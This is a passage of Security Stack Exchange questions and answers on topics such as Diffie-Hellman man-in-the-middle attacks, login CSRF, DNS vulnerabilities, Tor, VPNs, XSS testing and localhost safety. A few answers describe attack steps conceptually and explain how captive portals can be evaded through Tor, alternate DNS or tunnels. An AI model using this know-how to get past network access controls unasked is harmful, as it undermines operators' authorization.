<p><strong>Secondly</strong>, even if you <em>didn't</em> fill in your credentials, I'd recommend to change your password <em>as soon as possible</em> with an ad blocker <em>(like <a href=""https://adblockplus.org/"" rel=""nofollow noreferrer"">Adblock Plus</a>, <a href=""https://getadblock.com/"" rel=""nofollow noreferrer"">Adblock</a>, <a href=""https://www.ublock.org/"" rel=""nofollow noreferrer"">uBlock Origin</a> or similar)</em> installed and enabled in your browser. It is recommended to enable two-factor authentication on your Google account <em>(if you didn't do that already)</em> to prevent <em>(future)</em> leaked credentials from being misused.</p>

<p><strong>Thirdly</strong>, contact Google about this and supply them with details like your IP, URL, screenshots, date/time and as much information as you have. You can contact Google about this at ""goo.gl/vulnz"" or check <a href=""https://www.google.com/about/appsecurity"" rel=""nofollow noreferrer"">https://www.google.com/about/appsecurity</a></p>

<h2>Additional information</h2>

<p><strong>Alternative explanation</strong></p>

<p>Another explanation for this could be (although this would be unlikely and amateurish for a company like Google) that the developers overlooked a mistake in the development, testing and releasing process.</p>

<p>Also (as mentioned in different comments) this result could possibly be caused by some kind of man-in-the-middle attack (like a hacked proxy) or a malicious browser extension.</p>

<p><strong>Why change your password if you didn't fill in your credentials?</strong></p>

<p>The site showed an unusual but <strong>visible</strong> ""basic auth"" prompt from an external domain. Assuming that the domain was compromised (at least until it is proven not) the attackers could as well include other code that was <strong>not directly visible</strong>. Maybe persistent in cache? Maybe some kind of malware? Since we can't exclude that possibilities also, and since a password change or virus/malware scan won't hurt anyone, these are extra measures, just to be sure.</p>

<p><strong>Is doubleclick.net really owned by Google?</strong></p>

<p>Yes! As described in <a href=""https://en.wikipedia.org/wiki/DoubleClick"" rel=""nofollow noreferrer"">this Wikipedia article</a> and as shown in the <a href=""http://whois.domaintools.com/doubleclick.net"" rel=""nofollow noreferrer"">WHOIS</a> information of doubleclick.net. <code>Registrant Organization: Google Inc.</code></p>
","127668"
"Why can't I MitM a Diffie-Hellman key exchange?","15759","","<p>After reading the selected answer of <a href=""https://security.stackexchange.com/questions/45963/diffie-hellman-key-exchange-in-plain-english"">&quot;Diffie-Hellman Key Exchange&quot; in plain English</a> 5 times I can't, for the life of me, understand how it protects me from a MitM attack.</p>

<p>Given the following excerpt (from <a href=""https://security.stackexchange.com/a/45971/"">tylerl's answer</a>):</p>

<blockquote>
  <ol>
  <li>I come up with two prime numbers <strong>g</strong> and <strong>p</strong> and tell you what they are.</li>
  <li>You then pick a secret number (<strong>a</strong>), but you don't tell anyone. Instead you compute <strong>g<sup>a</sup></strong> <em>mod</em> <strong>p</strong> and send that result back to me. (We'll call that <strong>A</strong> since it came from <strong>a</strong>).</li>
  <li>I do the same thing, but we'll call my secret number <strong>b</strong> and the computed number <strong>B</strong>. So I compute <strong>g<sup>b</sup></strong> <em>mod</em> <strong>p</strong> and send you the result (called ""<strong>B</strong>"")</li>
  <li>Now, you take the number I sent you and do the exact same operation with <em>it</em>. So that's <strong>B<sup>a</sup></strong> <em>mod</em> <strong>p</strong>. </li>
  <li>I do the same operation with the result you sent me, so: <strong>A<sup>b</sup></strong> <em>mod</em> <strong>p</strong>.</li>
  </ol>
</blockquote>

<p>Here are the same 5 steps with Alpha controlling the network:</p>

<ol>
<li>You attempt to send me <strong><code>g</code></strong> and <strong><code>p</code></strong>, but Alpha intercepts and learns <strong><code>g</code></strong> and <strong><code>p</code></strong></li>
<li>You come up with <strong><code>a</code></strong> and attempt to send me the result of <strong><code>ga mod p</code></strong> (<strong><code>A</code></strong>), but Alpha intercepts and learns <strong><code>A</code></strong></li>
<li>Alpha comes up with <strong><code>b</code></strong> and sends you the result of <strong><code>gb mod p</code></strong> (<strong><code>B</code></strong>)</li>
<li>You run <strong><code>Ba mod p</code></strong></li>
<li>Alpha runs <strong><code>Ab mod p</code></strong></li>
</ol>

<p>During this whole process Alpha pretends to be you and creates a shared secret with me using the same method.</p>

<p>Now, both you and Alpha, and Alpha and me  each have pairs of shared secrets.</p>

<p>You now think it's safe to talk to me in secret, because when you send me messages encrypted with your secret Alpha decrypts them using the secret created by you and Alpha, encrypts them using the secret created by Alpha and me, then sends them to me. When I reply to you, Alpha does the same thing in reverse.</p>

<p>Am I missing something here?</p>
","<p>Diffie-Hellman is a key exchange protocol but does nothing about authentication.</p>

<p>There is a high-level, conceptual way to see that. In the world of computer networks and cryptography, all you can see, really, are zeros and ones sent over some wires. Entities can be distinguished from each other only by the zeros and ones that they can or cannot send. Thus, user ""Bob"" is really defined only by his ability to compute things that non-Bobs cannot compute. Since everybody can buy the same computers, Bob can be Bob only by his knowledge of some value that only Bob knows.</p>

<p>In the raw Diffie-Hellman exchange that you present, you talk to some entity that is supposed to generate a random secret value on-the-fly, and use that. Everybody can do such random generation. At no place in the protocol is there any operation that only a specific Bob can do. Thus, the protocol cannot achieve any kind of authentication -- you don't know who you are talking to. Without authentication, impersonation is feasible, and that includes simultaneous double impersonation, better known as <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"" rel=""noreferrer"">Man-in-the-Middle</a>. At best, raw Diffie-Hellman provides a weaker feature: though you do not know who you are talking to, you still know that you are talking to the same entity throughout the session.</p>

<hr />

<p>A single cryptographic algorithm won't get you far; any significant <em>communication protocol</em> will assemble several algorithms so that some definite security characteristics are achieved. A prime example is <a href=""https://security.stackexchange.com/questions/20803/how-does-ssl-tls-work/20847#20847"">SSL/TLS</a>; another is <a href=""https://en.wikipedia.org/wiki/Secure_Shell"" rel=""noreferrer"">SSH</a>. In SSH, a Diffie-Hellman key exchange is used, but the server's public part (its <em>g</em><sup><em>b</em></sup> mod <em>p</em>) is <em>signed</em> by the server. The client knows that it talks to the right server because the client remembers (from a previous initialization step) the server's public key (usually of type RSA or DSA); in the model explained above, the rightful servers is defined and distinguished from imitators by its knowledge of the signature private key corresponding to the public key remembered by the client. That signature provides the authentication; the Diffie-Hellman then produces a shared secret that will be used to encrypt and protect all the data exchanges for that connection (using some symmetric encryption and MAC algorithms).</p>

<p>Thus, while Diffie-Hellman does not do everything you need by itself, it still provides a useful feature, namely a <a href=""https://en.wikipedia.org/wiki/Key_exchange"" rel=""noreferrer"">key exchange</a>, that you would not obtain from digital signatures, and that provides the temporary shared secret needed to encrypt the actually exchanged data.</p>
","91706"
"How to protect against login CSRF?","15758","","<p><a href=""http://seclab.stanford.edu/websec/csrf/csrf.pdf"" rel=""nofollow noreferrer"">http://seclab.stanford.edu/websec/csrf/csrf.pdf</a> points out that most CSRF protection mechanisms fail to protect login forms. As <a href=""https://stackoverflow.com/a/15350123/14731"">https://stackoverflow.com/a/15350123/14731</a> explains:</p>

<blockquote>
  <p>The vulnerability plays out like this:</p>
  
  <ol>
  <li>The attacker creates a host account on the trusted domain</li>
  <li>The attacker forges a login request in the victim's browser with this host account's credentials</li>
  <li>The attacker tricks the victim into using the trusted site, where they may not notice they are logged in via the host account</li>
  <li>The attacker now has access to any data or metadata the victim ""created"" (intentionally or unintentionally) while their browser was logged in with the host account</li>
  </ol>
</blockquote>

<p>This attack has been <a href=""http://en.wikipedia.org/wiki/Cross-site_request_forgery#Forging_login_requests"" rel=""nofollow noreferrer"">successfully employed against Youtube</a>.</p>

<p>The authors of the paper went on to propose the addition of an ""Origin"" header but ran into resistance by W3C members: <a href=""http://lists.w3.org/Archives/Public/public-web-security/2009Dec/0035.html"" rel=""nofollow noreferrer"">http://lists.w3.org/Archives/Public/public-web-security/2009Dec/0035.html</a></p>

<p>To date, only Chrome and Safari implements the ""Origin"" header. IE and Firefox do not and it's not clear whether they ever will.</p>

<p>With that in mind: what is the best way to protect against CSRF attacks on login forms?</p>

<p><strong>UPDATE</strong>: I am looking for a RESTful solution, so ideally I want to avoid storing server-side state per user. This is especially true for non-authenticated users. If it's impossible then obviously I will give up on this requirement.</p>
","<h1>With anonymous cookies</h1>

<p>If you are happy to generate secure tokens which are set as anonymous users' cookies, but not to store them server side then you could simply <a href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#Double_Submit_Cookies"">double submit cookies</a>.</p>

<p>e.g. Legitimate user:</p>

<ol>
<li>Anon user navigates to the login page, receives cookie which is sent to the browser.</li>
<li>Anon user logs in and the browser sends the cookie as a header and as a hidden form value.</li>
<li>User now logged in.</li>
</ol>

<p>This cannot be abused by the attacker as the following will now happen:</p>

<ol>
<li>The attacker creates a host account on the trusted domain</li>
<li>The attacker forges a login request in the victim's browser with this host account's credentials <strong>However, the attacker does not have access to the victim's cookie value and cannot forge it as the CSRF token in the request body. The attack fails.</strong></li>
</ol>

<p>Even if your site is only accessible over HTTPS and you correctly set the <a href=""https://www.owasp.org/index.php/SecureFlag"">Secure Flag</a>, care must be taken with this approach as an attacker could potentially <a href=""https://www.owasp.org/index.php/Man-in-the-middle_attack"">MiTM</a> <em>any</em> connection from the victim to <em>any</em> HTTP website (if the attacker is suitably placed of course), redirect them to your domain over HTTP, which is also MiTM'd and then set the required cookie value. This would be a <a href=""https://www.owasp.org/index.php/Session_fixation"">Session Fixation</a> attack. To guard against this you could output the cookie value to the header and the hidden form field <em>every</em> time this (login) page is loaded (over HTTPS) rather than reuse any already set cookie value.  This is because although a browser can set the Secure Flag, it will still send cookies without the Secure Flag over a HTTPS connection, and the server will not be able to tell whether the Secure Flag was set. (Cookie attributes such as the Secure Flag are only visible when the cookie is set, not when it is read. The only thing the server gets to see is the cookie name and value.) Implementing <a href=""http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"">HSTS</a> would be a good option for protection in supported browsers.</p>

<p>It is advisable to set <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options"">X-Frame-Options</a> to prevent a UI redress click jacking attack (otherwise the attacker could possibly use site functionality to pre fill their username and password awaiting the user to click and submit them along with the CSRF value).</p>

<h1>Without anonymous cookies</h1>

<p>If you do not want to set cookies for anonymous users (which then may suspect that they are being tracked server side) then the following approach may be used instead: A multi-stage login form.</p>

<p>The first stage is the usual username / password combination.</p>

<p>After the form is submitted, it redirects to another form. This form is protected by a special intermediary authentication token cookie and a CSRF token. The authentication here will only allow the second stage authentication to be submitted, but will not allow any other actions on the account (except possibly a full logout). This will enable the CSRF token to be associated and used by this user account only on this intermediary  session.</p>

<p>Now it is only when this form is submitted, including the token cookie and CSRF hidden form value that the user is fully authenticated with the domain. Any attacker attempting a CSRF attack will not be able to retrieve the CSRF token and their full login attempt will fail.</p>

<p>The only drawback is that the user will have to manually click to complete login, which may be a clunky user experience. It is advisable to set <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options"">X-Frame-Options</a> to prevent this being used in combination with a UI redress click jacking attack. Any auto submission with JavaScript would be beneficial to the attacker and would cause their attack to possibly succeed, so at the moment I can only see a manual click by the user working.</p>

<p>It would now play out like this:</p>

<ol>
<li>The attacker creates a host account on the trusted domain</li>
<li>The attacker forges a login request in the victim's browser with this host account's credentials <strong>but they cannot proceed past stage two to become fully authenticated</strong></li>
<li>The attacker tricks the victim into using the trusted site - <strong>but as they are not fully authenticated, the site will act as though the user is unauthenticated</strong></li>
</ol>
","59529"
"Listing of DNS vulnerabilities","15752","","<p>I am currently studying how to setup DNS servers and all aspects of the DNS system. I would also like to study the security aspect. I want to use current DNS server attack on my test servers. Is there one place that lists the current attacks that are used by hackers so I can learn how to prevent them?</p>
","<p>I'm not sure that there's any single place that lists <em>all</em> of the vulnerabilities related to DNS, but here are some pointers you might use for further research.</p>

<h1>General DNS Weaknesses</h1>

<p>One broad category of DNS vulnerabilities would be at the protocol- and system-layer.</p>

<ul>
<li>The wikipedia article on DNS lists <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/Domain_Name_System#Security_issues"">security issues</a> with the system.</li>
<li>A particular vulnerability is <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/DNS_cache_poisoning"">cache poisoning</a>.</li>
<li>You can learn about <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/Domain_Name_System_Security_Extensions"">DNSSEC</a> as a countermeasure against some of the weaknesses in the protocol.</li>
<li>Here's a list of <a href=""http://cr.yp.to/djbdns/notes.html"">notes on DNS</a> that point out several system-level weaknesses.</li>
<li>DNS is described in numerous <a href=""http://www.zoneedit.com/doc/rfc/"">RFCs</a>. (That list is not up to date. You can find newer RFCs by looking at the references section in a <a href=""https://tools.ietf.org/html/rfc6014"">recent DNS RFC</a>.) Modern RFCs include a ""Security Considerations"" section that discusses security aspects related to the topic of the RFC.</li>
</ul>

<h1>Specific Vulnerabilities in DNS Implementations</h1>

<p>Another broad category of vulnerabilities are bugs in specific implementations of DNS. There have been so many bugs in ISC Bind, for example, that this attack vector is much more likely to be successful than an attack at the system level (this depends on the target and the environment, though).</p>

<ul>
<li>Search the <a href=""http://web.nvd.nist.gov/view/vuln/search?execution=e2s1"">National Vulnerabilities Database</a>. (E.g. <a href=""http://web.nvd.nist.gov/view/vuln/search-results?query=isc+bind&amp;search_type=last3years&amp;cves=on"">ISC Bind</a>)</li>
<li>Search at <a href=""http://www.securityfocus.com/vulnerabilities"">SecurityFocus</a></li>
<li>Look for exploits in the <a href=""http://www.exploit-db.com/search/"">exploit database</a>.</li>
<li>Metasploit and various other scan tools may be able to automatically detect vulnerabilities on unpatched servers.</li>
</ul>

<h1>Complex Interactions</h1>

<p>Studying DNS in a vacuum isn't really enough, though. DNS interacts with other protocols in interesting ways.</p>

<p>For example, if your network doesn't protect against rogue DHCP servers, it may be possible for an attacker to run a DHCP server that hands out a lease that points to a rogue DNS server. The DNS server then returns whatever addresses the attacker wants -- substituting his own address for <code>paypal.com</code>, or rerouting email, for example.</p>
","9482"
"Why disable JavaScript in Tor?","15750","","<p>Why it is not advisable to use JavaScript with Tor? Yet with JavaScript, you cannot get the IP address of the user except through an external website. How could using JavaScript with Tor expose one's identity?</p>
","<p>I do not know where you got that information but wherever you got it, the <a href=""https://www.torproject.org/docs/faq.html.en#TBBJavaScriptEnabled"">official documentation</a> is more reliable:</p>

<blockquote>
  <p>We configure NoScript to allow JavaScript by default in Tor Browser
  because many websites will not work with JavaScript disabled. </p>
  
  <p>If you disable JavaScript by default but then allow a few websites to
  run scripts (the way most people use NoScript), then your choice of
  whitelisted websites acts as a sort of cookie that makes you
  recognizable (and distinguishable), thus harming your anonymity.</p>
</blockquote>

<p>But <a href=""https://github.com/diafygi/webrtc-ips"">unlike</a> Firefox and Chrome, Tor browser  have not implemented <a href=""http://www.webrtc.org/web-apis"">WebRTC</a> that allows requests to STUN servers be made that will return the local and public IP addresses for the user.</p>
","95047"
"Can an open Wi-Fi hotspot be considered ""secure"" when using a VPN connection?","15734","","<p>There are many open Wi-Fi hotspots scattered around from cafes to airports.</p>

<p>I understand that a non-passworded Wi-Fi leaves traffic unencrypted and therefore available for hackers to read. I also know about a <a href=""https://en.wikipedia.org/wiki/Man-in-the-middle_attack"">man-in-the-middle attack</a> where the Wi-Fi hotspot is malicious.</p>

<p>I therefore always use a VPN connection to encrypt my traffic while using open Wi-Fi hotspots to avoid these attacks.</p>

<p>But the article <em><a href=""http://arstechnica.com/security/2015/06/even-with-a-vpn-open-wi-fi-exposes-users/"">Even with a VPN, open Wi-Fi exposes users</a></em> states that even with a VPN connection, an open Wi-Fi hotspot is still insecure. It states:</p>

<blockquote>
  <p>In this period before your VPN takes over, what might be exposed
  depends on what software you run. Do you use a POP3 or IMAP e-mail
  client? If they check automatically, that traffic is out in the clear
  for all to see, including potentially the login credentials. Other
  programs, like instant messaging client, may try to log on.</p>
</blockquote>

<p>But at the same time the article feels like a disguised advert concluding with (what feels like) a sales pitch for something called Passpoint which I have never heard of:</p>

<blockquote>
  <p>The Wi-Fi Alliance has had a solution for this problem nearly in place
  for years, called <a href=""http://www.wi-fi.org/discover-wi-fi/wi-fi-certified-passpoint"">Passpoint</a>.</p>
</blockquote>

<p>Can an open Wi-Fi hotspot be considered secure when using a VPN connection or should you NEVER use open hotspots?</p>
","<p>This is actually exactly the type of environment VPNs were designed to work in: when you cannot trust the local network.</p>

<p>If set up properly (i.e. making sure all traffic goes through the VPN and using a secure mutual authentication scheme) it will pretty well protect your connection.</p>

<p>This, however, requires the whole thing to be designed properly. </p>

<ol>
<li>Obviously, your VPN must be set up so that ALL your communication goes through the encrypted channel, not just the part that is aimed at the internal network behind it (which is sometimes the case with corporate firewalls or if you're using SSH).    </li>
<li>Avoid using SSL VPN unless you're using a pinned certificate for the server: you'll want to avoid having to perform PKI validation of the server's host name since it can be rather delicate.    </li>
<li>Understand the limitation: you will not be able to ""mask"" the fact that you're using a VPN, you will not mask the volume and pattern of your exchange (which can be to some extent used to identify the type of service you're using) and your connection will ONLY be secure up to the VPN exit point: everything between that point and the destination server will not be protected by the VPN (although it can also be encrypted on its own).</li>
<li>There is no guarantee against a state actor who would be willing to spend dedicated resources to penetrate your security.</li>
</ol>
","114765"
"Which Cryptography algorithm is used in WhatsApp end-to-end security?","15733","","<p>I have a presentation to make on Social Network Security. I have been doing some research regarding this.</p>

<p>I did a lot of searching, but was unable to find the Crypto Algorithm used by WhatsApp for end-to-end Encryption.</p>
","<p>WhatsApp partnered with Open Whisper Systems for the cryptographic portions of messaging. The process involves a variation of Off the Record (<a href=""https://en.wikipedia.org/wiki/Off-the-Record_Messaging"">OTR</a>), Perfect Forward Secrecy (PFS), and the Double Ratchet Algorithm (<a href=""https://en.wikipedia.org/wiki/Double_Ratchet_Algorithm"">DRA</a>).</p>

<p>Open Whisper Systems has blog posts on <a href=""https://whispersystems.org/blog/advanced-ratcheting/"">cryptographic ratcheting</a>, and their <a href=""https://whispersystems.org/blog/whatsapp-complete/"">Signal Protocol Integration for WhatsApp</a>.</p>
","120239"
"Security issues with allowing Dropbox installations on client PC's in our organisation","15732","","<p>Does anyone know if there is any good reasons not to allow Dropbox installations on our client PC's? All the PC's have antivirus installed and running. I know it is an additional attack vector to spreading files, but the kind of risk I am specific worried about is automatic spreading due to synchronization of files.</p>

<p>Can potential virus on the dropbox spread easier once the file is in the cloud as it potentially could be synchronized to our client, and then automatically spread? Is there any security mechanisms to prevent this kind of spreading? </p>

<p>I am not taking into consideration that files may be infected when the user opens them. These kinds of risks are already considered in all the other applications that allow file sharing (email, USB dongles and so on). </p>

<p>The kind of risk I am specific worried about is automatic spreading due to synchronization of files.</p>
","<blockquote>
  <p>Does anyone know if there is any good reasons not to allow Dropbox installations on our client PC's?</p>
</blockquote>

<p>This depends on a number of factors such as your willingness to accept risks, classification (sensitivity) of data you store/process or otherwise manage and for example the potential for increased user productivity.</p>

<p>There have been a number of confidentiality related issues regarding Dropbox such as <a href=""http://blog.dropbox.com/?p=821"" rel=""nofollow"">this</a>, <a href=""http://www.informationweek.com/news/storage/security/229500683"" rel=""nofollow"">and this</a> and the fact that data is encrypted server-side. There are arguments both for and against the use of Dropbox but it always comes down to your willingness to accept risk and hence compromise on security for the increased convenience.</p>

<blockquote>
  <p>Can potential virus on the dropbox spread easier once the file is in the cloud as it potentially could be synchronized to our client, and then automatically spread?</p>
</blockquote>

<p>Yes, absolutely. Earlier versions of MS Office documents had macros enabled by default and many worms targeted those for spreading (later versions have however significantly improved in this area!).</p>

<p>But a worm/trojan could be specifically written to take advantage of Dropbox file sharing. When executed (for whatever reason) it could scan the computer and look for the Dropbox folder, replace files, rename or by any other means put itself in a place where the user is likely to execute it. It's clearly an excellent way of spreading malware to and from computers and networks.</p>

<blockquote>
  <p>Is there any security mechanisms to prevent this kind of spreading?</p>
</blockquote>

<p>Depends on what you mean with spreading, but I'm assuming you're talking about the execution of a windows binary from one of your company managed computers. Then yes, there are several ways of doing that. Using Windows 7 applocker you could simply restrict what applications are allowed to execute, or use an application to monitor for ""new"" executable files and remove them/quarantine or whatever action you deem desirable.</p>

<p>Additionally our good old friend AV will catch whatever old malware lands in the Dropbox folder, assuming reasonable coverage by the product. Know that there are statistics that seem to indicate that the most popular AV-products are the worst, but that even the best ones aren't great either. (Nothing new there really!)</p>

<p>One of the more obvious difficulties with allowing Dropbox is to make clear the separation between company assets and private assets. It's inevitable that users will also use Dropbox on their private computers, hence storing company data on private computers over which you have no control.</p>

<p>However, this again all depends on your willingness to accept risk. The threats are clearly identified and it would be a fairly easy exercise to calculate associated risk for each threat and provide you with a list of quantified risks. There are also technical safeguards you can implement to reduce the likelihood of some risks related to what you were specifically concerned about. </p>

<p>I would argue however that spreading of malware shouldn't be your top priority, instead you should focus on how to keep a clear separation between private and company owned data assets. This is the real headache in using any type of file synchronization product or service between corporate and home computers. There are products that would also address concerns regarding information disclosure but I digress.</p>

<p>Perhaps you are willing to accept these risks in order to avoid the cost of implementing required safeguards?</p>
","6191"
"Benefit to disabling TLS1.1 and TLS1.2?","15725","","<p>In light of recent developments on SSL issues such as BEAST and POODLE, I decided to configure my browser to only allow TLS1.1 and higher. The trouble is, that I am finding a lot of websites which do not work correctly (some websites serve all JS and CSS resources as HTTPS always) or at all. A bit of digging usually reveals that there is no cipher overlap, or no protocol overlap. In a lot of cases, I found websites are only accepting maximum protocol version of TLS1.0.</p>

<p>My question is, is there some good reason from a security perspective to allow only TLS 1.0, or is it simply pure ""laziness"", and there is no good reason not to allow TLS1.1 and TLS1.2 in addition to TLS1.0?</p>
","<p>No, there is absolutely no <em>security</em> related reason to continue to support TLS 1.0, but there are several other business concerns which can twist the arm of a system engineer into allowing it. For larger sites, they may be trying not to leave people with older browsers out in the cold. For some situations, the person publishing the website needs to assume you are using I.E 6 with no updates. </p>

<p>It sounds ridiculous, and it is, but it's a fact of life. </p>

<p>That said, if the server doesn't support anything above TLS 1.0, that's a problem no matter how you slice it. You should e-mail them about it. Or, if it's not fixed, stop using the site. </p>

<p>Sometimes it only takes one angry e-mail to set things right. </p>

<p>Edit: 
I shall emphasize that supporting a legacy operating system or software stack is no excuse for exposing your users to encryption with major known faults. </p>
","85470"
"Does WhatsApp disclose the sender's IP address?","15671","","<p>Does WhatsApp disclose the sender's IP address? Is it possible to get it by running <code>netstat -a</code> or via Wireshark?</p>
","<p>WhatsApp uses a client/server architecture based on <a href=""http://en.wikipedia.org/wiki/Jabber"" rel=""noreferrer"">Jabber (XMPP)</a>.</p>

<p>For the recipient(s) to see your IP addresses, the application will have to include your IP address in the metadata of the message. But this has no functional role in the design of such an application.</p>

<p>Your packet capture will likely show IP addresses belonging to WhatsApp(or Facebook) and maybe a CDN company like Akamai that stores media.</p>
","98081"
"Efficient way for finding XSS vulnerabilities?","15652","","<p><em>Manual (reliable) way</em>: Put string containing characters that have special meaning in HTML into some parameter of HTTP request, look for this string in HTTP response (and possibly) in other places where it's rendered. However, this way is very long as all actions like putting inputs into parameters and finding those strings in HTTP responses are performed manually.</p>

<p><em>Automated (fast) way</em>: Run security scanner like Arachni. But <a href=""https://github.com/Arachni/arachni/blob/master/modules/audit/xss.rb"" rel=""nofollow"">it seems (after looking at code)</a> that it will find vulnerabilities only in usual contexts and won't treat specially CSS values, JS code etc.</p>

<p>So what is a more efficient (fast and reliable) way for finding XSS vulnerabilities? I'm interested in changing manual way into semi-automated to make process faster</p>
","<p>In terms of finding a wider range of XSS issues that, from what I've seen, is really scanner dependent (excellent starting point for that <a href=""http://sectooladdict.blogspot.co.uk/2012/07/2012-web-application-scanner-benchmark.html"" rel=""nofollow"">here</a>) and none of them will be perfect (i.e. there will always be cases in black-box scanning where a manual tester will find an issue that scanners will miss).  Some have a wider range of vectors and techniques than others.</p>

<p>If you're looking to widen out the coverage of automated tools, you could add in grey/white box tools as they can find issues that are harder to locate with a black-box approach.  As an example <a href=""https://github.com/presidentbeef/brakeman"" rel=""nofollow"">Brakeman</a> for Ruby on Rails applications has detection for XSS issues.</p>

<p>Also other specialist tools as @Tate Hansen mentions above Dominator for DOMXSS issues.</p>

<p>Essentially as with most things in security there is no silver bullet.  You can improve automated coverage by combining multiple tools and approaches, although there will be some areas that are still best discovered manually.</p>
","20476"
"Is it possible to pass TCP handshake with spoofed IP address?","15640","","<p>Little time ago, me and my friends argued if TCP handshake can be passed with a spoofed IP address. </p>

<p>Assume I have a https web server that allows only admin's IP numbers. 
Can anyone connect that web server via IP spoof?</p>
","<p>Short answer: no.</p>

<p>Longer answer: yes, if you control a router device close to the target device (it has to be on the path between the the real source IP address and the target, and on the path between the faked IP address and the target) or if the target network/host accepts <a href=""https://web.archive.org/web/20100112025140/http://www.rapid7.com/vulndb/lookup/generic-ip-source-routing-enabled"" rel=""nofollow noreferrer"">source-routed packets</a>.</p>
","37482"
"How can I securely develop a local webapp at a coffee shop?","15632","","<p>When I'm developing a webapp, let's say a Django site, I run it locally and typically access it at <a href=""http://localhost"" rel=""noreferrer"">http://localhost</a>.</p>

<p>I thought this was inherently secure because I assumed that localhost can only be accessed locally. However, I discovered that even running a local web server (Apache, Nginx...) with a self-signed HTTPS certificate won't help because localhost is not really required to be local:</p>

<blockquote>
  <p>In empirical testing, we've seen multiple resolvers... send localhost queries to the network... As a result accessing ""<a href=""https://localhost"" rel=""noreferrer"">https://localhost</a>"", say, on a hostile WiFi access point (such as your coffee shops) can be intercepted by a network attacker and redirected to a site (or a certificate) of their choosing. (In email chain ""<a href=""https://cabforum.org/pipermail/public/2015-June/005673.html"" rel=""noreferrer"">Exception to Baseline Requirements, section 7.1.4.2.1</a>"".)</p>
</blockquote>

<p>If I'm developing a webapp, I need to run it locally and access it through a browser. Sometimes I need to do this at a coffee shop with an internet connection. What access point should I use, if not localhost?</p>

<p><strong>Note</strong></p>

<p>Some of my desktop applications also expose themselves via HTTP at other ports, for example <a href=""http://localhost:9000"" rel=""noreferrer"">http://localhost:9000</a>. Presumably I shouldn't access those at a coffee shop either?</p>
","<p>Safely developing against localhost can be done provided: </p>

<ul>
<li>your machine is configured to resolve localhost to a loopback address (note, it's possible to change your hosts file to resolve localhost to a different address)</li>
<li>your machine is configured to route the loopback address via the loopback interface (it's possible to route loopback addresses to non loopback interface)</li>
<li>you configure your application to listen on the loopback address, not 0.0.0.0 (many web frameworks listens on 0.0.0.0 by default, this is probably the most common reason for unexpectedly exposing services to untrusted network during development)</li>
<li>if you use a proxy, your browser is configured not to route localhost/loopback through the proxy</li>
</ul>

<p>In other words, a fairly typical networking configuration.</p>

<p>Also, take care that your database server aren't binding to 0.0.0.0, as that'll allow anyone on the network to connect directly to the database server. It's probably best to set a firewall configuration so you know exactly what ports and addresses that local services are listening on. </p>

<p>The link you pointed is under the context of a publicly trusted CA issuing certificates with ""localhost"" name. This is unsafe under that context because the recipient of such certificate may use the certificate to intercept the communication of someone with some unusual networking configurations. When you have full control over your own machine's configuration and you know that you don't have some weird configurations on your machines, the loopback interface is safe.</p>
","159732"
"ssh always too many authentication failures","15629","","<p>No matter on which server I try to connect via password login, I always get the error message</p>

<p>Too many authentication failures for</p>

<p>If I have exchanged the ssh-keys, I can login without password as before, also if I rename my user <code>~/.ssh</code> folder, I get to the password prompt as suspected.</p>

<p>What can I have wrong in my <code>.ssh</code> folder?</p>

<p>If I run <code>ssh-add -l</code> this list is > 5</p>

<p>So I have more than 5 keys in my ssh-agent and it seem to insist on looping through all my keys in my agent (whith none of them fitting, cause I didnt create a key for this server) before reaching <code>max_tries</code>.</p>

<p>I also read this: <a href=""https://serverfault.com/questions/580753/ssh-aborts-with-too-many-authentication-failures"">SSH aborts with Too many authentication failures</a></p>

<p>But I couldn't find the solution there, (maybe because of lack of understanding)</p>

<p>The only way to login for me is to call ssh with the option PreferredAuthentications=password: </p>

<pre><code>ssh -o PreferredAuthentications=password host.example.org
</code></pre>

<p><strong>But that is just a workaround</strong>. How can I fix this?</p>
","<p>Add this in your <code>~/.ssh/config</code>: </p>

<pre><code>Host *
   IdentitiesOnly yes
</code></pre>

<p>source: <a href=""https://superuser.com/q/268776"">How do I configure SSH so it dosen&#39;t try all the identity files automatically?</a></p>
","80756"
"Is anybody using client browser certificates?","15599","","<p>Client browser certificates seem to be a nice way to protect sites from intruders - it is impossible to guess and should be harder to steal. Of course, they do not solve all the problems, but they add security.</p>

<p>However, I didn't encounter any public sites using them. Are there sites that use them? Is there some flaw in them that precludes the usage even when security is important or some other reason why there's so little usage of them? </p>
","<p>Client side certificated just haven't had a good enough cost/benefit tradeoff.  They are very confusing to users so support costs go up.  And they are still just bits and thus ""something you know"" and are vulnerable to a range of software attacks on the browser, the distribution scheme, phishing etc.</p>

<p>Hardware token schemes (two-factor authn) are better for good authn.   Single-sign-on (SSO) schemes, potentially federated, and potentially backed by hardware tokens, solve more issues and are easier to deploy.</p>

<p>Managing a lot of certificates would be far more complicated for a user than the current thorny multiple-password issue, and browsers don't offer good support for selecting the right certificate.  And if a user uses a single cert for lots of sites, then there are privacy issues since use of the certificate identifies the user.</p>

<p>Over the decades, a lot of us have thought that the age of end-user PK-crypto was just around the corner, especially those like me enamored of the beauty of RSA.  It just turns out that the way it has evolved, the help desk and development costs and subtleties and complexities and legal entanglements of real-world PKI keep eating up the benefits.</p>

<p>Equipment seems more expensive than bits, but not if the bits don't do the job, or effective use of them eats up productivity.</p>
","1437"
"Bypassing a captive portal with tor","15592","","<p>I know that NSXTS and Iodine can be used to bypass a captive portal by taking advantage of permissive DNS firewall rules.</p>

<p>What I have found recently is that simply by using Tor, I can also bypass a captive portal without any need for manually configuring a DNS server under my control. Nor do I have to agree to anything, I can simply browse as though I were connected directly to the internet.</p>

<p>How is this possible, and how would I prevent it when setting up a captive portal?</p>
","<p>curiousguy is correct that Tor doesn't actually obfuscate the protocol other than HTTPS. Of note, however, is that Tor (using something like Tor Browser or Vidalia) does proxy DNS requests through Tor.</p>

<p>Some captive portals work only by redirecting default DNS to a login portal. If this is the case, the combination of encrypted communication and third-party DNS could subvert the captive portal. That said, changing DNS manually to something like 8.8.8.8 (Google public DNS) and browsing HTTPS pages, using a VPN, SSH tunnel, etc, would also subvert this portal.</p>

